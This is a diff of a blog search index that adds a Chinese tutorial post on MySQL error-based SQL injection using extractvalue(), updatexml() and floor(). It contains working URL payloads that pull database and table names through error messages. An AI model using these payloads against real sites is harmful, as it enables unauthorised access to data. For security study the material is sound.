@@ -1,14 +1,40 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>blog</title>
+    <title>报错注入</title>
     <url>/2025/07/24/blog/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<h3 id="常用的三个函数如下"><a href="#常用的三个函数如下" class="headerlink" title="常用的三个函数如下"></a>常用的三个函数如下</h3><p>1.extractvalue()<br>2.updatexml()<br>3.floor()</p>
+<h3 id="1-extractvalue"><a href="#1-extractvalue" class="headerlink" title="1.extractvalue()"></a>1.extractvalue()</h3><p>两个参数，第一个参数时XML文档名称，第二个参数是路径<br>一般格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select extractvalue(doc,&#x27;/book/title&#x27;) from xml</span><br></pre></td></tr></table></figure>
+
+<h4 id="什么时候报错："><a href="#什么时候报错：" class="headerlink" title="什么时候报错："></a>什么时候报错：</h4><p>1.把查询参数路径写错：查询不到内容，但不会报错</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select extractvalue(doc,&#x27;/book/titlle&#x27;) from xml</span><br></pre></td></tr></table></figure>
+<p>2.把查询参数格式符号写错：提示报错信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select extractvalue(doc,&#x27;~book/title&#x27;) from xml</span><br></pre></td></tr></table></figure>
+<p>因此一般在第二个参数的位置构造语句实现报错</p>
+<h4 id="注意点："><a href="#注意点：" class="headerlink" title="注意点："></a>注意点：</h4><p>因为默认只能返回32个字符串，<br>此时需要使用substring函数解决此问题<br>substring函数有三个参数，第一个是我们要查询的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substring(concat(0x7e,(select database())),1,30)</span><br></pre></td></tr></table></figure>
+<p>此语句的作用是从第一个开始，一次性显示30个字符串，看完前面的再看后面的将得到的信息拼接起来即可，显示1~30个字符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substring(concat(0x7e,(select database())),31,30)</span><br></pre></td></tr></table></figure>
+<p>显示31~59个字符</p>
+<h4 id="利用extracvalue-报错注入"><a href="#利用extracvalue-报错注入" class="headerlink" title="利用extracvalue()报错注入"></a>利用extracvalue()报错注入</h4><p>查库名实现方式：<br>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=100&#x27; union select 1,extractvalue(1,concat(0x7e,(select database()))),3 --+（会回显出来正确的数据库的名称）</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=100&#x27; and  1=extractvalue(1,concat(0x7e,(select database()))) --+</span><br></pre></td></tr></table></figure>
+<p>concat就是起到拼接作用</p>
+<p>查表名实现方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=100&#x27; union select 1,extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database()))),3 --+</span><br></pre></td></tr></table></figure>
+<h3 id="2-updatexml"><a href="#2-updatexml" class="headerlink" title="2.updatexml()"></a>2.updatexml()</h3><p>三个参数，<br>第一个参数是文档对象的名称，string格式<br>第二个参数是路径<br>第三个参数是new_value,string格式，替换查找到的符合条件的数据</p>
+<p>我们构造语句的位置仍然是第二个参数的位置<br>构造方式类似</p>
+<h3 id="3-floor报错"><a href="#3-floor报错" class="headerlink" title="3.floor报错"></a>3.floor报错</h3><p>rand()函数:随机返回0~1间的小数<br>floor()函数:小数向下取整数。 </p>
+]]></content>
       <categories>
-        <category>crypto</category>
+        <category>web</category>
       </categories>
       <tags>
-        <tag>复现</tag>
+        <tag>sql</tag>
       </tags>
   </entry>
 </search>
